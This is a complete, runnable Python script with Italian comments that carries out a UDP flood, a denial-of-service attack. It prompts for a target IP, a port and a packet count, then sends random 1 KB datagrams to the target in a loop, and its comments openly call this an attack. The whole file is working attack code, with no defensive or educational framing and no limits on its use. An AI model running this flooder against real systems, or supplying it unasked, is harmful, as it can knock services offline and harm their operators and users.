import socket
import random

def udp_flood(target_ip, target_port, num_packets):
    # Creare un socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generare un pacchetto di 1 KB
    packet_size = 1024  # 1 KB
    packet = random.randbytes(packet_size)
    
    # Inviare il numero specificato di pacchetti
    for i in range(num_packets):
        sock.sendto(packet, (target_ip, target_port))
        print(f"Pacchetto {i+1} inviato a {target_ip}:{target_port}")

if __name__ == "__main__":
    # Richiedere i dati all'utente
    target_ip = input("Inserisci l'IP target: ")
    target_port = int(input("Inserisci la porta target: "))
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
    
    # Avviare l'attacco UDP flood
    udp_flood(target_ip, target_port, num_packets)


